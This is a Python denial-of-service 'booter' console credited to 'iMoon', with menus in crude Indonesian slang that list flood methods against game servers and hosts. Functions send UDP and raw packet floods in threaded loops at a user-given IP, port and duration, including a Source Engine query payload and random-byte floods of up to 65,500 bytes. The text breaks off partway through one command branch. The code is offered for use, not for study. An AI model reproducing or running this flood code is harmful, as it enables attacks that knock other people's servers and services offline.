#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json
from time import sleep
nicknm = "iMoon"

mt = """\033[36mService under \033[0;34mmaintance"""

methods = """
\033[0;36m AWAS KAU LEAK KU TUMBUK BAPAK MU MAU?
\033[0;36m  ╔═════════════════════════╦════════════════════════════╗
\033[0;36m  ║ \033[0;34m1. Game Bypass Methods. Commands = bypass            \033[0;36m║
\033[0;36m  ║ \033[0;34m2. Layer4. Commands = layer4                         \033[0;36m║
\033[0;36m  ║ \033[0;34m3. VIP. Commands = vip         			 \033[0;36m║
\033[0;36m  ║ \033[0;34mNon-Copyright Items Issue       		         \033[0;36m║
\033[0;36m ╔╩═══════════════════════╝  ╚═══════════════════════════╩╗
"""

raw = """
\033[0;36m        TOBAT DEK DDOS MULU 
\033[0;36m	SUS NANTI VPS ORANG MAU KAU GANTI?
\033[0;36m		TOBAT DEK PLEASE LAH YAAAA	
\033[0;36m                              TOOLS BY iMoon

\033[0;36m            ╔══════════════════════════╦════════════════════════════╗
\033[0;36m            ║ \033[0;34mudpraw \033[36m- \033[0;34mRaw UDP Flood \033[0;36m  ║ \033[0;34mhexraw \033[36m- \033[0;34mRaw HEX Flood \033[0;36m    ║
\033[0;36m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[0;36m             ║ \033[0;34mtcpraw \033[36m- \033[0;34mRaw TCP Flood \033[0;36m║ ║ \033[0;34mvseraw \033[36m- \033[0;34mRaw VSE Flood \033[0;36m  ║
\033[0;36m             ║ \033[0;34mstdraw \033[36m- \033[0;34mRaw STD Flood \033[0;36m║ ║ \033[0;34msynraw \033[36m- \033[0;34mRaw SYN Flood \033[0;36m  ║
\033[0;36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚═══════════════════════════════════════════════════════╝
"""
slaprape = """
\033[0;36m		                KENAPA GA SENENG?
\033[0;36m                          NGENTOT LWHO	        
\033[0;36m                             Tools By iMoon              
                                       KENAPA KAU KONTOL?

\033[0;36m            ╔══════════════════════════╦════════════════════════════╗
\033[0;36m            ║ \033[0;34movhslav \033[36m- \033[0;34mSlavic Flood \033[0;36m  ║ \033[0;34miotv1 \033[36m- \033[0;34mCustom Method!  \033[0;36m   ║
\033[0;36m            ║ \033[0;34mcpukill \033[36m- \033[0;34mCpu Rape Flood\033[0;36m ║ \033[0;34miotv2 \033[36m- \033[0;34mCustom Method!  \033[0;36m   ║
\033[0;36m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[0;36m             ║ \033[0;34mfivemkill \033[36m- \033[0;34mFivem Kill \033[0;36m║ ║ \033[0;34miotv3 \033[36m-\033[0;34m Custom Method!  \033[0;36m ║
\033[0;36m             ║ \033[0;34micmprape  \033[36m- \033[0;34mICMP Rape  \033[0;36m║ ║ \033[0;34mssdp  \033[36m-\033[0;34m Amped SSDP      \033[0;36m ║
\033[0;36m             ║ \033[0;34mtcprape \033[36m- \033[0;34mRaping TCP   \033[0;36m║ ║ \033[0;34marknull \033[36m- \033[0;34mArk Method    \033[0;36m ║
\033[0;36m             ║ \033[0;34mnforape \033[36m- \033[0;34mNfo Method   \033[0;36m║ ║ \033[0;34m2kdown  \033[36m- \033[0;34mNBA 2K Flood  \033[0;36m ║
\033[0;36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚═══════════════════════════════════════════════════════╝
"""

private = """
\033[0;36m              ¢{¢{¢{|{¶|¶`¶∆`∆~∆¶¢×^=^=^×√¶^¶^¶^℅®℅®℅$]%}€¶¶$×¢{^=^{•¶`∆`¶•{=¢^={¢}•}|}|{¢{¢{^[${`}}`}`¶~¶€¶¢}¢{^{[^[^^¶¶•¶|}|}|}|}}}¢^
\033[0;36m                              {$${{$¶${©{¢¢{¢{¢{¢{¢{¢{¢{¢{¢{¢¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢¢{{¢{¢¢{¢{¢{¢{¢{¢{¢{¢	        
\033[0;36m                              ====================By iMoon=============={¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{¢{$
\033[0;36m                           {¢|××|×$¢{{¢{¢{¢{¢}¢}¢}¢}¢}¢}¢}¢}¢}¢}¢}¢}¢}¢¶|¶`¶∆~∆~∆~∆¶¢¢{{®{®¢[¢[¢[•=|×|¶$¶{¢[¢¢[[¢¢[¢{{¢{¢{

\033[0;36m            ╔══════════════════════════╦════════════════════════════╗
\033[0;36m            ║ \033[0;34mhomeslap    \033[36m. \033[0;34mr6kill     \033[0;36m║ \033[0;34mfivemtcp  \033[36m. \033[0;34mnfokill       \033[0;36m ║
\033[0;36m            ║ \033[0;34mark255      \033[36m. \033[0;34marklift    \033[0;36m║ \033[0;34mhotspot   \033[36m. \033[0;34mvpn           \033[0;36m ║
\033[0;36m            ║ \033[0;34mhydrakiller \033[36m. \033[0;34markdown    \033[0;36m║ \033[0;34mnfonull   \033[36m. \033[0;34mdhcp          \033[0;36m ║
\033[0;36m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[0;36m             ║ \033[0;34movhnat    \033[36m. \033[0;34movhamp     \033[0;36m║ ║ \033[0;34movhwdz    \033[36m. \033[0;34movhx         \033[0;36m║
\033[0;36m             ║ \033[0;34mnfodrop   \033[36m. \033[0;34mnfocrush   \033[0;36m║ ║ \033[0;34mnfodown   \033[36m. \033[0;34mnfox         \033[0;36m║
\033[0;36m             ║ \033[0;34mudprape   \033[36m. \033[0;34mudprapev3  \033[0;36m║ ║ \033[0;34mfortnite  \033[36m. \033[0;34mfortnitev2   \033[0;36m║
\033[0;36m             ║ \033[0;34mudprapev2 \033[36m. \033[0;34mudpbypass  \033[0;36m║ ║ \033[0;34mgreeth    \033[36m. \033[0;34mtelnet       \033[0;36m║
\033[0;36m             ║ \033[0;34mfivemv2   \033[36m. \033[0;34mr6drop     \033[0;36m║ ║\033[0;34m r6freeze  \033[36m. \033[0;34mkillall      \033[0;36m║
\033[0;36m             ║ \033[0;34m2krape    \033[36m. \033[0;34mfallguys   \033[0;36m║ ║ \033[0;34movhdown   \033[36m. \033[0;34movhkill      \033[0;36m║
\033[0;36m             ║ \033[0;34mfivemrape \033[36m. \033[0;34mfivemdown  \033[0;36m║ ║ \033[0;34mfivemv1   \033[36m. \033[0;34mfivemslump   \033[0;36m║
\033[0;36m             ║ \033[0;34mkillallv2 \033[36m. \033[0;34mkillallv3  \033[0;36m║ ║ \033[0;34mpowerslap \033[36m. \033[0;34mrapecom      \033[0;36m║
\033[0;36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚═══════════════════════════════════════════════════════╝
"""


layer4 = """\033[0;36m
\033[0;36m		               =============$BACOT DEK$============
\033[0;36m                                             	        ================
\033[0;36m                             
\033[0;36m                   


\033[0;36m            ╔══════════════════════════╦════════════════════════════╗
\033[0;36m            ║  \033[0;34mudp \033[36m[IP] [TIME] [PORT]  \033[0;36m║   \033[0;34mvse \033[36m[IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ║  \033[0;34mtcp \033[36m[IP] [TIME] [PORT]  \033[0;36m║   \033[0;34mack \033[36m[IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[0;36m             ║ \033[0;34mstd \033[36m[IP] [TIME] [PORT] \033[0;36m║ ║ \033[0;34mdns \033[36m[IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m             ║ \033[0;34msyn \033[36m[IP] [TIME] [PORT] \033[0;36m║ ║ \033[0;34movh \033[36m[IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m             ║\033[36m- - - - - - - \033[93mhomerape \033[0;34m[IP] [TIME] [PORT] \033[36m- - - - - -\033[0;36m║
\033[0;36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚═══════════════════════════════════════════════════════╝
"""

layer7 = """\033[0;36m
\033[0;36m		                =========$BACOT DEK$========
\033[0;36m                                      
\033[0;36m                              
\033[0;36m                           

\033[0;36m            ╔══════════════════════════╦════════════════════════════╗
\033[0;36m            ║  \033[0;34mhttp-stm \033[36m[IP] [TIME] [PORT]  \033[0;36m	       		 
\033[0;36m            ║  \033[0;34mhttp-cld \033[36m[IP] [TIME] [PORT]  \033[0;36m		
\033[0;36m            ╚╦════════════════════════╦╩╦═════════════════════════╦╝
\033[0;36m             ║ \033[0;34mddos-guard \033[36m[IP] [TIME] [PORT] \033[0;36m                           
\033[0;36m             ║ \033[0;34mcloudflare \033[36m[IP] [TIME] [PORT] \033[0;36m                             
\033[0;36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚═══════════════════════════════════════════════════════╝
"""

banner =  """
\060[0;35m		      ~÷|×•××•×•¶•¶¶|¶$¶¢¶•¶•¶¢{{^[^{®{®{¢{•[¢[¢[¢[•[¢¢[[¢[=¢{¢{¢{¢{¢{¢{¢{|{¢×{¢¢{•¶¢}¢{®{^•∆|∆|∆¢¶^{^{^[^[^[®[®[®[[^¢[¢[[¢
\060[0;35m                             	¢{{¢{••×{•×¢¶|¶¶|¶|¶|∆¢¶¢{^{¢¶|∆|∆|{{•{¢{¢¶•¶|¶|}|¶`∆∆`∆`∆`∆`${¢{¢{¢{¢{       ×•{¢{¢[¢[®[®[®[®[®[®[¢[¢[¢[®®[[¢[¢[¢[|[|]`{${¢{¢{©{©{¢{
\060[0;35m        [|{${{$¢{¢{¢{{©{    {¢{¢{¢¶®¶^¶^¶^¶^¶^¶}||}|}}                  `×`××|×•{¢=¢¢=¢=€{€}€}€}¢[®[[™™¢=¢×¢{¢=¢=¢{}|}$}¢{¢{¢{¢{¢{¢{¢{¢{¢{®{®{¢{{${${${¢¶$¶¶$}${¢{©
\060[0;35m                  =================TOOLS BY IMOON  FEAT KOBOY FESBUK====================================================        ¢{¢{$$}|¶¶|¶`¶`¶`¶|¶
\063[0;35m               =¢=$|×|¶¶|¶${¢¢{¢{¢{¢{¢{¢{¢{¢{¢¢{¢{¢=¢=¢=¢[¢[¢[¢=¢[¢[¢[¢[¢[¢¢[[¢¢[¢=×||×¶$¶¢¶¢¶¢¶¢¶×¢®{®{®{®{®{®[®[®[®[¢[¢[¢[¢[¢[¢[¢=¢{$[$=$[¢[¢[¢[®[®[®[®[[®[¢¢[¢[¢[¢[[®[®[®[®[®[®[[
\065[0;35m              ¢=•×{|{|{¢{¢{¢{¢{¢{                ====BACOT ============================= KHANJUT BHADAG  =========================       ${{$${¶¢¶¢¶¢¶$¶`∆`¶|¶|{¢
\065[0;35m     =¢=¢=¢×|¶|¶×¢{¢{^{^^{^{{|¶|¶|¶¶^{^{^{™{™{^•{×|¶|¶¢¶¢}^{^{^{^{^[^[^[^[^[^[^[^[¢[•{•}|¶|¶`¶¶¢¶^{^{^[^{¢¶•¶|¶¶|¶•¶¢¶¢¶^¶^{^{^{^]•¶¶|¶|¶•}¢}¢}¢}}®}®{®{®{®{^{^}^}^}®{^{¢¶¶•¶|¶|¶|¶`¶`¶¶`¶`¶`¶`¶`¶`¶`¶

"""
attacked =  """
\033[0;36m		                
\033[0;36m                                     
\033[0;36m                              

\033[0;34mOI\033[36mSent\033[0;34m TEMBOS DEK
\033[0;34mType HELP

"""

helpservice =  """
\033[0;36m		      ================NASA SAJA ABANG DDOS TEMBUS DEK====================
\033[0;36m                           ==================❤APALAGI HATI ADEK ❤====================         
\033[0;36m                           
\033[0;36m                           
\033[0;36m
\033[0;36m             ╦═════════════════════||
\033[0;36m	       ║ \033[0;34mMETHODS ||  ||				   \033[0;36m║
\033[0;36m	       ║ \033[0;34mPLAN    ||  ||				   \033[0;36m║
\033[0;36m             ╩═════════════════════||



"""

vip = """
\033[0;36m MY VIP ACCESS = \033[0;32mTRUE
\033[0;36m		           ╦  ╦╦╔═╗  ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\033[0;36m                           ╚╗╔╝║╠═╝  ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\033[0;36m                            ╚╝ ╩╩    ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\033[0;36m                 ╔═════════════╦═════════════════════════════════╗
\033[0;36m                 ║ RAW         ║ Shows All VIP Raw Methods       ║
\033[0;36m                 ║ LAYER7      ║ Shows All VIP L7 Methods        ║
\033[0;36m                 ║ PRIMITIVE   ║ Shows All VIP Primitive Methods ║
\033[0;36m                 ║ PIT         ║ Shows All VIP PitAPI Methods    ║
\033[0;36m                 ╚═════════════╩═════════════════════════════════╝

"""

plan =  """
\033[0;36m		             =====================================      ==========================
\033[0;36m                           ======================	-+-Tools By iMoon  ==========================
\033[0;36m                            =======================================================================        
\033[0;36m                           =============================   =======================================
\033[0;36m                          =====================  =====================================================
\033[0;36m VIP = TRUE
\033[0;36m USERNAME = iMoon                
\033[0;36m ADMIN = TRUE
\033[0;36m EXPIRED TIME = NEVER
\033[0;36m API ACCESS = TRUE




"""
cooldown = """
\033[0;36m		
\033[0;36m                             	TUNGGU DEK SABAR SIKIT        
\033[0;36m                              
\033[0;36m =============IMOON GANTENG DEK======================"""
invalid = """\033[0;36mInvalid\033[0;34mCommands"""
cookie = open(".sinfull_cookie","w+")

fsubs = True
tpings = True
pscans = True
liips = True
tattacks = True
uaid = True
said = True
running = True
iaid = True
haid = True
aid = True
attack = True
ldap = True
http = True
atks = True

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1
              
              


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		powerran = (random.randint(30,100))
		sys.stdout.write("\x1b]2;[-] NGENTOT SAJAH DEK | Api Connected [5] | Backup Server [1] | Online User [2] | Admin: [iMoon] | POWER : {}% [UNSTABLE]\x07".format (powerran))
		sin = input("\033[0;36m{}\033[0;34m@[KOBOY FESBUK]\033[36m--> \033[0;31m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("cls")
			print (banner)
			main()
		if sinput == "cls":
			os.system ("cls")
			print (banner)
			main()
		elif sinput == "?":
			os.system ("cls")
			print (banner)
			main()
		elif sinput == "layer4":
			os.system ("cls")
			print (layer4)
			main()
		elif sinput == "plan":
			os.system ("cls")
			print (plan)
			main()
		elif sinput == "method":
			os.system ("cls")
			print (methods)
			main()
		elif sinput == "methods":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (methods)
			main()
		elif sinput =="vip":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (vip)
			main()
		elif sinput == "primitive":
			os.system ("cls")
			print (private)
			main()
		elif sinput == "bypass":
			os.system ("cls")
			print (slaprape)
			main()
		elif sinput == "raw":
			os.system ("cls")
			print (raw)
			main()
		elif sinput == "help":
			os.system ('cls')
			print (helpservice)
			main()
		elif sinput == "layer7":
			os.system ("cls")
			print (layer7)
			main()
		elif sinput == "pit":
			os.system ("cls")
			print ("PIT")
			main()
		elif sinput == "":
			print(invalid)
			main()
		elif sinput == "logout":
			print("Leaving Service in 3 Seconds")
			time.sleep(3)
			os.system ("cls")
			exit()
		elif sinput == "std":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[97m[-] Sending Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[\] Sending Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[|] Sending Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[/] Sending Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[+] Sending Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[-] Sending Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[/] Sending Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[97m[-] Sending Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[\] Sending Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[|] Sending Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[/] Sending Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[+] Sending Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[-] Sending Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[/] Sending Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[97m[-] Sending Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[\] Sending Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[|] Sending Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[/] Sending Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[+] Sending Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[-] Sending Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[/] Sending Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 20179
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 6048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 20179
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
